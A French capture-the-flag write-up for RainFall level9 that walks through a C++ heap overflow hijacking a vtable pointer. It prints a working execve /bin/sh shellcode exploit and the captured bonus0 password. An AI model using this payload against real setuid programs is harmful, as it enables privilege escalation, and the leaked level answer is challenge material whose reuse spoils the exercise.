Connextion au level8 -> Bit NX desactive
Chech du home et des permissions du binaire -> Bit SUID bonus0
Exection du binaire -> aucune sortie

Apres avoir desassemble le binaire avec gdb, le nom des fonctions standard sont peu comprehensible
Apres recherche j'ai compris qu'il s'agit de noms genere par un compilateur de c++
Il est aussi possible d'obtenir la signature de chaque fonction en passant chaque nom dans le programme c++filt
J'ai alors pu reconstituer l'ensemble du code source

"""
	a.setAnnotation(argv[1]);
"""
"""
N::setAnnotation(char *ptr)
{
	memcpy(this.str, ptr, strlen(ptr));
}
"""

Le premier argument du programme est copie sans test de taille dans la memoire de la premiere allocation de l'objet 'N'

"""
	a = new(Obj(5));
	b = new(Obj(6));
"""

Sachant qu'il y a une deuxieme allocation qui suit, celle ci peut alors etre modifie avec un buffer overflow

"""
	a = b + a;	//(b.ptr.(surchage +)(a, b);)
"""

La fonction de surcharge d'operateur se situe a l'adresse pointee par l'adresse de la table virtuelle de la classe N

l'adresse de cette table virtuelle est le premier pointer dans la memoire alloue par un objet de classe 'N' et set au debut du constructeur

"""
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
"""

L'adresse de la fonction de surcharge n'est donc pas appele directement par le programme, elle est stocke dans le registre edx apres 2 redirections de pointeur (objet -> vtable -> fonction de surcharge)

"""
gdb-peda$ run A
gdb-peda$ x/50wx 0x0804a008
0x804a008:	0x08048848	0x00000041	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
"""
"""
	private:
		void *ptr; 0x0
		char str[100]; 0x4
		int nb; 0x68
"""

La memoire affiche est le contenu de la heap avant l'appel de la surcharge, nous voyons bien les 2 allocations commencant par l'adresse de la vtable (0x08048848)

Nous voyons aussi ou est ecrit l'argument 1 du programme ('A')

Il faut 108 octets + 4 octets pour ecraser l'adresse de la vtable du second objet alloue

Je dispose d'un shellcode d'une taille de 45 octets

Sachant qu'il y a 2 redirections d'adresse avant le call il faut que l'adresse de la vtable ecrase soit une adresse du buffer qui elle meme soit une adresse vers le shellcode

Il faut alors ajouter une adresse supplementaire (4 octets)

108 - (45 + 4) = 59

Il nous reste alors 59 octets libre qu'on peut set par des \x90 pour faciliter l'exploit

le payload doit ressembler a ca :

adresse du shellcode (4 octets) + 59 * \x90 + shellcode (45 octets) + adresse contenant l'adresse du shellcode (4 octets)

level9@RainFall:~$ ./level9 $(python -c 'print "\x38\xa0\x04\x08" + "\x90"*59 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x0c\xa0\x04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ pwd
/home/user/level9
$ cd /home/user/bonus0
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
